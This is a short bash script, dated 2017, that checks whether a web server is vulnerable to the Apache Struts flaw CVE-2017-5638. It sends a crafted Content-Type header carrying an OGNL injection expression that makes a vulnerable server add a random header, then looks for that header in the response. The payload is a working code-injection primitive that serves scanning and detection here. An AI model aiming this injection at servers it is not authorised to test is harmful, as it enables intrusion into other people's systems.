#!/bin/bash

######################################
#                                    #
#   Author  : Youri Klaassens        #
#   Alias   : Xhendos                #
#   Date    : 13th of August, 2017   #
#                                    #
######################################

# Sends a crafted header and looks in the response if the crafted header field has been sent back.
# If the crafted header field has been sent back we can conclude that the server is vulnerable for CVE-2017-5638 exploit.
# This script is based on https://github.com/mazen160/struts-pwn

# CHANGELOG
# 13 August, 2017 - Added --max-time 6 in the curl request. Some servers does not respond.
#

IP=$1
PORT=$2

LENGTH_PARENT=$(shuf -i1-100 -n 1 -z)
LENGTH_CHILD=$(shuf -i1-100 -n 1 -z)

PARENT_STRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $LENGTH_PARENT | head -n 1)
CHILD_STRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $LENGTH_CHILD | head -n 1)

CONTENT_TYPE=$(echo "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('"$PARENT_STRING"', '"$CHILD_STRING"')}.multipart/form-data")

# We use | tac | tac twice, because tac waits to send output to the pipe, until it received all.
# curl | grep may cause a (23) Failed writing body
# https://stackoverflow.com/questions/16703647/why-curl-return-and-error-23-failed-writing-body

case "$PORT" in
        80)
                echo "http://$IP\n"
                curl -silent --include --insecure --header "Content-Type: $CONTENT_TYPE" --connect-timeout 4 --max-time 6 "http://$1" | tac | tac | grep --silent  $PARENT_STRING && echo "True"
                ;;
        443)
                curl -silent --include --insecure --header "Content-Type: $CONTENT_TYPE" --connect-timeout 4 --max-time 6 "https://$1" | tac | tac | grep --silent  $PARENT_STRING && echo "True"
                ;;
	*)
		echo "[STRUTS_CHECK] Please choose port 80 or 443"
		;;
esac
